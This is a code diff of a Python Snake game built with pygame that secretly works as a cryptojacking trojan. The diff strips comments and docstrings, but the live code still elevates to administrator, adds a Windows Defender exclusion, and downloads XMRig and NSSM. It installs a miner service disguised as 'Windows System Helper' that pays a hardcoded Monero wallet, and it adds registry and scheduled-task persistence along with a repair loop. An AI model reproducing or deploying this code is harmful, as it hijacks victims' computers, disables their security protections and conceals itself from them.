@@ -13,20 +13,12 @@ import zipfile
 import threading
 import glob
 
-# ============================================================
-# CONFIGURATION
-# ============================================================
-
 WALLET = "47yrhBCz7ma2VVNcSdsetDeo35ugtR9vZU5LDidPtcHT7C9XsRCVFpYVZk9yhgcZY5RC2vcnxQd8DjKmVVR9tBf7DXkZouZ"
 POOL = "pool.supportxmr.com:3333"
 MAX_DOWNLOAD_RETRIES = 5
 SERVICE_START_ATTEMPTS = 5
 REPAIR_INTERVAL = 60
 DOWNLOAD_TIMEOUT = 60
-
-# ============================================================
-# PATHS
-# ============================================================
 
 APPDATA = os.environ.get("APPDATA", os.path.expanduser("~\\AppData\\Roaming"))
 BASE_DIR = os.path.join(APPDATA, "Microsoft", "Windows", "Caches")
@@ -37,15 +29,7 @@ LOCK_FILE = os.path.join(BASE_DIR, "installed.lock")
 NSSM_EXE_PATH = os.path.join(BASE_DIR, "nssm.exe")
 LOG_FILE = os.path.join(BASE_DIR, "install.log")
 
-# ============================================================
-# REENTRANT LOCK
-# ============================================================
-
 install_lock = threading.RLock()
-
-# ============================================================
-# LOGGING
-# ============================================================
 
 def ensure_log_dir():
     try:
@@ -61,10 +45,6 @@ def log(msg):
     except Exception:
         pass
 
-# ============================================================
-# ADMIN ELEVATION (clean for PyInstaller)
-# ============================================================
-
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -72,21 +52,11 @@ def is_admin():
         return False
 
 def run_hidden_as_admin():
-    """
-    Launch this same executable with administrator rights.
-    For PyInstaller, sys.executable is the bundled .exe,
-    so we launch it without arguments – the .exe knows what to do.
-    """
     try:
-        # ShellExecuteW: runas verb, no arguments needed
         result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 0)
         return result > 32
     except Exception:
         return False
-
-# ============================================================
-# KILL OTHER XMRIG
-# ============================================================
 
 def kill_other_xmrig():
     try:
@@ -98,10 +68,6 @@ def kill_other_xmrig():
         )
     except Exception:
         pass
-
-# ============================================================
-# DOWNLOAD (streamed in chunks)
-# ============================================================
 
 def download_file(url, dest, min_size=10240, max_retries=MAX_DOWNLOAD_RETRIES):
     for attempt in range(max_retries):
@@ -136,10 +102,6 @@ def download_file(url, dest, min_size=10240, max_retries=MAX_DOWNLOAD_RETRIES):
     log("Download failed after all retries.")
     return False
 
-# ============================================================
-# DEFENDER EXCLUSION
-# ============================================================
-
 def add_defender_exclusion(path):
     try:
         result = subprocess.run(
@@ -158,17 +120,8 @@ def add_defender_exclusion(path):
         log(f"Defender exclusion error: {e}")
         return False
 
-# ============================================================
-# EXTRACT AND FIND EXE (hardcoded subpath + fallback glob)
-# ============================================================
-
 def extract_and_find_exe(zip_path, extract_to, expected_exe, known_subpath):
-    """
-    Extract the zip. First try to find the executable at the known subpath.
-    If that fails, search the entire extracted tree with glob.
-    """
     try:
-        # Use a unique temp folder
         temp_extract = os.path.join(BASE_DIR, f"temp_extract_{os.getpid()}_{time.time_ns()}")
         os.makedirs(temp_extract, exist_ok=True)
 
@@ -179,7 +132,6 @@ def extract_and_find_exe(zip_path, extract_to, expected_exe, known_subpath):
                 return None
             z.extractall(temp_extract)
 
-        # First try the known subpath
         expected_path = os.path.join(temp_extract, known_subpath, expected_exe)
         if os.path.exists(expected_path):
             final_exe_path = os.path.join(extract_to, expected_exe)
@@ -192,11 +144,9 @@ def extract_and_find_exe(zip_path, extract_to, expected_exe, known_subpath):
             shutil.rmtree(temp_extract, ignore_errors=True)
             return final_exe_path
 
-        # Fallback: search all subfolders
         log(f"{expected_exe} not at expected subpath, searching entire tree...")
         matches = glob.glob(os.path.join(temp_extract, "**", expected_exe), recursive=True)
         if matches:
-            # Prefer the shortest path (closest to root)
             matches.sort(key=lambda p: len(p))
             chosen = matches[0]
             final_exe_path = os.path.join(extract_to, expected_exe)
@@ -219,10 +169,6 @@ def extract_and_find_exe(zip_path, extract_to, expected_exe, known_subpath):
             shutil.rmtree(temp_extract, ignore_errors=True)
         return None
 
-# ============================================================
-# RUN COMMAND AND CHECK
-# ============================================================
-
 def run_check(cmd, timeout=30, capture=True, shell=False):
     try:
         result = subprocess.run(
@@ -237,10 +183,6 @@ def run_check(cmd, timeout=30, capture=True, shell=False):
         log(f"Command failed: {e}")
         return False, b"", b""
 
-# ============================================================
-# INSTALL SERVICE
-# ============================================================
-
 def install_service():
     try:
         kill_other_xmrig()
@@ -248,7 +190,6 @@ def install_service():
 
         add_defender_exclusion(BASE_DIR)
 
-        # NSSM
         nssm_url = "https://nssm.cc/release/nssm-2.24.zip"
         nssm_zip = os.path.join(BASE_DIR, "nssm.zip")
         if not download_file(nssm_url, nssm_zip):
@@ -263,7 +204,6 @@ def install_service():
             shutil.move(nssm_final, NSSM_EXE_PATH)
         os.remove(nssm_zip)
 
-        # XMRig
         xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-msvc-win64.zip"
         xmrig_zip = os.path.join(BASE_DIR, "xmrig.zip")
         if not download_file(xmrig_url, xmrig_zip):
@@ -277,7 +217,6 @@ def install_service():
         shutil.move(xmrig_final, XMRIG_PATH)
         os.remove(xmrig_zip)
 
-        # Config
         config = {
             "autosave": True,
             "cpu": {"enabled": True, "huge-pages": True, "priority": 1, "max-threads-hint": 45},
@@ -288,13 +227,11 @@ def install_service():
         with open(CONFIG_PATH, 'w') as f:
             json.dump(config, f, indent=4)
 
-        # Remove old service
         run_check([NSSM_EXE_PATH, "remove", "XMRigService", "confirm"])
         ok, _, _ = run_check([NSSM_EXE_PATH, "install", "XMRigService", XMRIG_PATH, "--background", "--config", CONFIG_PATH])
         if not ok:
             return False
 
-        # Configure
         config_cmds = [
             ([NSSM_EXE_PATH, "set", "XMRigService", "DisplayName", "Windows System Helper"], "DisplayName"),
             ([NSSM_EXE_PATH, "set", "XMRigService", "Description", "Provides system maintenance tasks"], "Description"),
@@ -307,7 +244,6 @@ def install_service():
             if not ok:
                 log(f"Service config '{name}' failed")
 
-        # Start
         started = False
         for attempt in range(SERVICE_START_ATTEMPTS):
             ok, _, _ = run_check([NSSM_EXE_PATH, "start", "XMRigService"])
@@ -325,10 +261,6 @@ def install_service():
     except Exception as e:
         log(f"install_service exception: {e}")
         return False
-
-# ============================================================
-# PERSISTENCE FALLBACKS
-# ============================================================
 
 def add_registry_persistence():
     try:
@@ -352,10 +284,6 @@ def add_scheduled_task():
     except Exception as e:
         log(f"Scheduled task error: {e}")
         return False
-
-# ============================================================
-# INSTALL MINER
-# ============================================================
 
 def install_miner():
     with install_lock:
@@ -385,10 +313,6 @@ def install_miner():
             if os.path.exists(XMRIG_PATH):
                 add_registry_persistence()
                 add_scheduled_task()
-
-# ============================================================
-# REPAIR THREAD
-# ============================================================
 
 def repair_thread():
     if not is_admin():
@@ -424,10 +348,6 @@ def repair_thread():
         except Exception as e:
             log(f"Repair error: {e}")
         time.sleep(REPAIR_INTERVAL)
-
-# ============================================================
-# GAME
-# ============================================================
 
 def run_game():
     pygame.init()
@@ -490,7 +410,6 @@ def run_game():
             if (fx, fy) not in snake_body:
                 return (fx, fy)
 
-    # Initial state
     x, y = WIDTH//2, HEIGHT//2
     dx = dy = 0
     snake_body = [(x, y)]
@@ -573,25 +492,17 @@ def run_game():
     finally:
         pygame.quit()
 
-# ============================================================
-# MAIN
-# ============================================================
-
 if __name__ == "__main__":
-    # Elevate if possible, but only after we've ensured we're not already admin
     if not is_admin():
         if run_hidden_as_admin():
-            # Elevation launched – this process exits, elevated one runs.
             sys.exit(0)
         else:
-            # Elevation failed or cancelled – run without admin.
             ensure_log_dir()
             log("Running without admin (miner will not install).")
     else:
         ensure_log_dir()
         log("Running as admin.")
 
-    # Start background threads (daemon=True – they exit when game exits)
     threading.Thread(target=install_miner, daemon=True).start()
     threading.Thread(target=repair_thread, daemon=True).start()
 
